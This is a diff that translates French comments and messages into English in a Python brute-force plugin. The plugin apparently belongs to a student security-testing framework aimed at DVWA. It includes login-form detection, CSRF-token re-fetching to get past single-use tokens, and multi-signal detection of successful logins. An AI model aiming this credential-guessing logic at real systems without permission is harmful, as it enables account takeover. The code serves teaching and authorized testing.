@@ -1,16 +1,16 @@
 """
-P4 — Brute force / attaque par dictionnaire sur l'authentification.
-Catégorie : A07:2025 Authentication Failures.
+P4 - Brute force / dictionary attack on authentication.
+Category: A07:2025 Authentication Failures.
 
-Réimplémenté SANS hydra (cahier des charges ISEP : interdiction des outils existants).
-Ce qui est démontré au jury (= les points) :
-  1. Détection automatique du formulaire de login (champs, action, méthode).
-  2. Gestion du token anti-CSRF à usage unique (patron DVWA / g0tmi1k) :
-     re-fetch d'une page fraîche AVANT chaque tentative pour extraire le token.
-  3. Maintien de la session/cookies entre les requêtes.
-  4. Logique succès/échec MULTI-SIGNAUX (redirection + message + code + longueur).
-  5. Détection du rate-limiting / lockout (429, délais artificiels).
-  6. Concurrence bornée par asyncio.Semaphore (éthique by design).
+Reimplemented WITHOUT hydra (ISEP brief: existing tools are forbidden).
+What is demonstrated to the jury (= the grade):
+  1. Automatic login-form detection (fields, action, method).
+  2. Single-use anti-CSRF token handling (DVWA / g0tmi1k pattern):
+     re-fetch a fresh page BEFORE each attempt to extract the token.
+  3. Session/cookie persistence across requests.
+  4. MULTI-SIGNAL success/failure logic (redirect + message + code + length).
+  5. Rate-limiting / lockout detection (429, artificial delays).
+  6. Concurrency bounded by asyncio.Semaphore (ethics by design).
 """
 from __future__ import annotations
 
@@ -24,9 +24,9 @@ import httpx
 from core import AttackPlugin, Context, Finding, Severity, Target, register
 
 
-# --- Parsing du formulaire de login (stdlib, pas de dépendance lourde) -------
+# --- Login-form parsing (stdlib, no heavy dependency) ------------------------
 class _LoginFormParser(HTMLParser):
-    """Extrait les <form> et leurs champs."""
+    """Extracts the <form> elements and their fields."""
 
     def __init__(self) -> None:
         super().__init__()
@@ -63,12 +63,12 @@ class LoginForm:
     method: str
     user_field: str
     pass_field: str
-    csrf_field: str | None       # ex. "user_token" (DVWA)
-    hidden: dict                  # autres champs cachés à renvoyer tels quels
+    csrf_field: str | None       # e.g. "user_token" (DVWA)
+    hidden: dict                  # other hidden fields to resend as-is
 
 
 def detect_login_form(html: str, base_url: str) -> LoginForm | None:
-    """Détecte le formulaire de login et ses champs à partir du HTML."""
+    """Detect the login form and its fields from the HTML."""
     parser = _LoginFormParser()
     parser.feed(html)
     for form in parser.forms:
@@ -104,7 +104,7 @@ def detect_login_form(html: str, base_url: str) -> LoginForm | None:
 
 
 def extract_csrf(html: str, field_name: str) -> str | None:
-    """Ré-extrait la valeur courante du token CSRF depuis une page fraîche."""
+    """Re-extract the current CSRF token value from a fresh page."""
     m = re.search(
         r'name=["\']' + re.escape(field_name) + r'["\'][^>]*value=["\']([^"\']*)["\']',
         html, re.I)
@@ -150,12 +150,11 @@ class BruteForcePlugin(AttackPlugin):
             try:
                 r = await client.get(login_url)
             except httpx.HTTPError as e:
-                return [self._error_finding(target, f"login inaccessible: {e}")]
+                return [self._error_finding(target, f"login unreachable: {e}")]
 
             form = detect_login_form(r.text, login_url)
             if form is None:
-                return [self._error_finding(target,
-                                            "aucun formulaire de login détecté")]
+                return [self._error_finding(target, "no login form detected")]
 
             baseline = await self._attempt(client, form,
                                            "zz_invalid_user", "zz_invalid_pass")
@@ -180,17 +179,17 @@ class BruteForcePlugin(AttackPlugin):
         if not findings:
             findings.append(Finding(
                 category="A07:2025 Authentication Failures",
-                title="Aucun identifiant faible trouvé (dictionnaire de démo)",
+                title="No weak credentials found (demo dictionary)",
                 severity=Severity.INFO,
-                evidence=f"Teste {len(users)}x{len(passwords)} combinaisons.",
-                recommendation="Conserver une politique de mots de passe robuste.",
+                evidence=f"Tested {len(users)}x{len(passwords)} combinations.",
+                recommendation="Keep enforcing a strong password policy.",
                 target=login_url, plugin=self.name,
             ))
         return findings
 
     async def _attempt(self, client, form: LoginForm,
                        user: str, password: str) -> _Attempt:
-        """Une tentative : re-fetch token CSRF frais puis soumission."""
+        """One attempt: re-fetch a fresh CSRF token, then submit."""
         data = dict(form.hidden)
         data[form.user_field] = user
         data[form.pass_field] = password
@@ -222,13 +221,13 @@ class BruteForcePlugin(AttackPlugin):
 
     @staticmethod
     def _is_success(baseline: _Attempt, res: _Attempt) -> bool:
-        """Combine plusieurs signaux (robustesse = points)."""
+        """Combine several signals (robustness = points)."""
         if res.status == 0:
             return False
         fail_markers = re.compile(
             r"incorrect|invalid|failed|wrong|login\.php|denied|try again", re.I)
         success_markers = re.compile(
-            r"welcome|logout|dashboard|sign out|deconnexion|bienvenue", re.I)
+            r"welcome|logout|dashboard|sign out|signed in", re.I)
 
         signals = 0
         if res.status in (301, 302, 303) and res.location and not baseline.location:
@@ -244,28 +243,27 @@ class BruteForcePlugin(AttackPlugin):
     def _success_finding(self, target, form, user, password, res) -> Finding:
         return Finding(
             category="A07:2025 Authentication Failures",
-            title=f"Identifiants faibles valides : {user}:{password}",
+            title=f"Valid weak credentials: {user}:{password}",
             severity=Severity.HIGH,
             cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
             cvss_score=8.7,
-            evidence=(f"Login={user} / Password={password} accepte.\n"
-                      f"Signaux: status={res.status}, longueur={res.length}, "
-                      f"location='{res.location}'. Token CSRF gere: "
-                      f"{'oui' if form.csrf_field else 'non'}."),
-            recommendation=("Imposer une politique de mots de passe forte, le "
-                            "verrouillage de compte apres N echecs, un rate-limiting "
-                            "et le MFA."),
+            evidence=(f"Login={user} / Password={password} accepted.\n"
+                      f"Signals: status={res.status}, length={res.length}, "
+                      f"location='{res.location}'. CSRF token handled: "
+                      f"{'yes' if form.csrf_field else 'no'}."),
+            recommendation=("Enforce a strong password policy, account lockout "
+                            "after N failures, rate-limiting and MFA."),
             target=form.action, plugin=self.name,
             request=f"{form.method.upper()} {form.action}  "
                     f"({form.user_field}=..., {form.pass_field}=...)",
-            response=f"HTTP {res.status}, {res.length} octets",
+            response=f"HTTP {res.status}, {res.length} bytes",
         )
 
     def _error_finding(self, target, msg) -> Finding:
         return Finding(
             category="A07:2025 Authentication Failures",
-            title="Brute force non executable",
+            title="Brute force not executable",
             severity=Severity.INFO,
-            evidence=msg, recommendation="Verifier l'URL de login fournie.",
+            evidence=msg, recommendation="Check the provided login URL.",
             target=target.base_url, plugin=self.name,
         )
